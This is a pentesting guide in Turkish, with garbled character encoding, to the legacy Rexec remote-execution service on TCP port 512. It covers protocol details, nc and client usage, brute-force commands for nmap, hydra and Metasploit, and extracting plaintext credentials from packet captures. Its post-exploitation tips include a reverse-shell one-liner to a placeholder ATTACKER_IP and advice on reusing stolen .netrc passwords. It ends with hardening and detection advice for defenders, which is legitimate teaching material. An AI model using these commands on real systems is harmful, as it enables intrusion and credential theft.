# 512 - Pentesting Rexec

{{#include ../banners/hacktricks-training.md}}

## Temel Bilgiler

Rexec (uzaktan **exec**) orijinal Berkeley *r*-servisleri paketinin bir parÃ§asÄ±dÄ±r ( `rlogin`, `rsh`, â€¦ ile birlikte). **Sadece dÃ¼z metin kullanÄ±cÄ± adÄ± ve ÅŸifre ile kimlik doÄŸrulamasÄ±** yapÄ±lan bir **uzaktan komut yÃ¼rÃ¼tme** yeteneÄŸi saÄŸlar. Protokol, 1980'lerin baÅŸÄ±nda tanÄ±mlanmÄ±ÅŸtÄ±r (bkz. RFC 1060) ve gÃ¼nÃ¼mÃ¼zde **tasarÄ±m gereÄŸi gÃ¼vensiz** olarak kabul edilmektedir. Yine de, bazÄ± eski UNIX / aÄŸ baÄŸlantÄ±lÄ± ekipmanlarda varsayÄ±lan olarak etkinleÅŸtirilmiÅŸtir ve zaman zaman iÃ§ pentestler sÄ±rasÄ±nda ortaya Ã§Ä±kmaktadÄ±r.

**VarsayÄ±lan Port:** TCP 512 (`exec`)
```
PORT    STATE SERVICE
512/tcp open  exec
```
> ğŸ”¥  TÃ¼m trafik â€“ kimlik bilgileri de dahil â€“ **ÅŸifrelenmemiÅŸ** olarak iletilir. AÄŸa gÃ¶z atma yeteneÄŸine sahip olan herkes kullanÄ±cÄ± adÄ±nÄ±, ÅŸifreyi ve komutu geri alabilir.

### Protokol hÄ±zlÄ± bakÄ±ÅŸ

1. Ä°stemci TCP 512'ye baÄŸlanÄ±r.
2. Ä°stemci Ã¼Ã§ **NUL-terminatÃ¶r** dizesi gÃ¶nderir:
* stdout/stderr almak istediÄŸi port numarasÄ± (ASCII olarak) (genellikle `0`),
* **kullanÄ±cÄ± adÄ±**,
* **ÅŸifre**.
3. Ä°cra edilecek **komut** ile son bir NUL-terminatÃ¶r dizesi gÃ¶nderilir.
4. Sunucu, tek bir 8-bit durum baytÄ± (0 = baÅŸarÄ±, `1` = baÅŸarÄ±sÄ±zlÄ±k) ve ardÄ±ndan komut Ã§Ä±ktÄ±sÄ± ile yanÄ±t verir.

Bu, `echo -e` ve `nc` ile deÄŸiÅŸimi yeniden oluÅŸturabileceÄŸiniz anlamÄ±na gelir:
```bash
(echo -ne "0\0user\0password\0id\0"; cat) | nc <target> 512
```
EÄŸer kimlik bilgileri geÃ§erliyse, `id` komutunun Ã§Ä±ktÄ±sÄ±nÄ± aynÄ± baÄŸlantÄ± Ã¼zerinden doÄŸrudan alacaksÄ±nÄ±z.

### Ä°stemci ile manuel kullanÄ±m

BirÃ§ok Linux daÄŸÄ±tÄ±mÄ± hala **inetutils-rexec** / **rsh-client** paketinin iÃ§inde eski istemciyi sunmaktadÄ±r:
```bash
rexec -l user -p password <target> "uname -a"
```
EÄŸer `-p` atlanÄ±rsa, istemci ÅŸifreyi etkileÅŸimli olarak istemek iÃ§in bir istemde bulunacaktÄ±r (aÃ§Ä±k metin olarak aÄŸda gÃ¶rÃ¼nÃ¼r!).

---
## SayÄ±m & Kaba kuvvet

### [**Kaba kuvvet**](../generic-hacking/brute-force.md#rexec)

### Nmap
```bash
nmap -p 512 --script rexec-info <target>
# Discover service banner and test for stdout port mis-configuration

nmap -p 512 --script rexec-brute --script-args "userdb=users.txt,passdb=rockyou.txt" <target>
```
`rexec-brute` NSE, yukarÄ±da aÃ§Ä±klanan protokolÃ¼ kullanarak kimlik bilgilerini Ã§ok hÄ±zlÄ± bir ÅŸekilde denemektedir.

### Hydra / Medusa / Ncrack
```bash
hydra -L users.txt -P passwords.txt rexec://<target> -s 512 -t 8
```
`hydra` Ã¶zel bir **rexec** modÃ¼lÃ¼ne sahiptir ve en hÄ±zlÄ± Ã§evrimdÄ±ÅŸÄ± bruteforcer olarak kalÄ±r. `medusa` (`-M REXEC`) ve `ncrack` (`rexec` modÃ¼lÃ¼) aynÄ± ÅŸekilde kullanÄ±labilir.

### Metasploit
```
use auxiliary/scanner/rservices/rexec_login
set RHOSTS <target>
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```
ModÃ¼l baÅŸarÄ±lÄ± olduÄŸunda bir shell oluÅŸturacak ve kimlik bilgilerini veritabanÄ±nda saklayacaktÄ±r.

---
## Kimlik bilgilerini dinleme

Her ÅŸey dÃ¼z metin olduÄŸu iÃ§in, **aÄŸ yakalamalarÄ± paha biÃ§ilmezdir**. TrafiÄŸin bir kopyasÄ±yla hedefe dokunmadan kimlik bilgilerini Ã§Ä±karabilirsiniz:
```bash
tshark -r traffic.pcap -Y 'tcp.port == 512' -T fields -e data.decoded | \
awk -F"\\0" '{print $2":"$3" -> "$4}'  # username:password -> command
```
(In Wireshark *Decode As â€¦â€‹* TCP 512 â†’ REXEC'i etkinleÅŸtirerek gÃ¼zel bir ÅŸekilde ayrÄ±ÅŸtÄ±rÄ±lmÄ±ÅŸ alanlarÄ± gÃ¶rÃ¼ntÃ¼leyin.)

---
## Post-Exploitation ipuÃ§larÄ±

* Komutlar saÄŸlanan kullanÄ±cÄ±nÄ±n ayrÄ±calÄ±klarÄ±yla Ã§alÄ±ÅŸtÄ±rÄ±lÄ±r. EÄŸer `/etc/pam.d/rexec` yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa (Ã¶rneÄŸin `pam_rootok`), root shell'leri bazen mÃ¼mkÃ¼n olabilir.
* Rexec, kullanÄ±cÄ±nÄ±n shell'ini gÃ¶z ardÄ± eder ve komutu `/bin/sh -c <cmd>` aracÄ±lÄ±ÄŸÄ±yla Ã§alÄ±ÅŸtÄ±rÄ±r. Bu nedenle, birden fazla komutu zincirlemek veya ters shell'ler baÅŸlatmak iÃ§in tipik shell-escape hilelerini (`;`, ``$( )``, backticks) kullanabilirsiniz:
```bash
rexec -l user -p pass <target> 'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"'
```
* Parolalar genellikle diÄŸer sistemlerde **~/.netrc** iÃ§inde saklanÄ±r; eÄŸer bir host'u ele geÃ§irirseniz, bunlarÄ± yan hareket iÃ§in yeniden kullanabilirsiniz.

---
## GÃ¼Ã§lendirme / Tespit

* **rexec'i aÃ§Ä±ÄŸa Ã§Ä±karmayÄ±n**; onu SSH ile deÄŸiÅŸtirin. Neredeyse tÃ¼m modern *inetd* sÃ¼per sunucularÄ±, hizmeti varsayÄ±lan olarak yorum satÄ±rÄ±na alÄ±r.
* EÄŸer onu tutmanÄ±z gerekiyorsa, TCP wrapper'lar (`/etc/hosts.allow`) veya gÃ¼venlik duvarÄ± kurallarÄ± ile eriÅŸimi kÄ±sÄ±tlayÄ±n ve her hesap iÃ§in gÃ¼Ã§lÃ¼ parolalar zorunlu kÄ±lÄ±n.
* :512'ye giden trafiÄŸi ve `rexecd` sÃ¼reÃ§ baÅŸlatmalarÄ±nÄ± izleyin. Tek bir paket yakalama, bir ihlali tespit etmek iÃ§in yeterlidir.
* `rexec`, `rlogin`, `rsh`'yi birlikte devre dÄ±ÅŸÄ± bÄ±rakÄ±n â€“ bunlar Ã§oÄŸu aynÄ± kod tabanÄ±nÄ± ve zayÄ±flÄ±klarÄ± paylaÅŸÄ±r.

---

## Referanslar

* Nmap NSE `rexec-brute` belgeleri â€“ [https://nmap.org/nsedoc/scripts/rexec-brute.html](https://nmap.org/nsedoc/scripts/rexec-brute.html)
* Rapid7 Metasploit modÃ¼lÃ¼ `auxiliary/scanner/rservices/rexec_login` â€“ [https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login](https://www.rapid7.com/db/modules/auxiliary/scanner/rservices/rexec_login)
{{#include ../banners/hacktricks-training.md}}
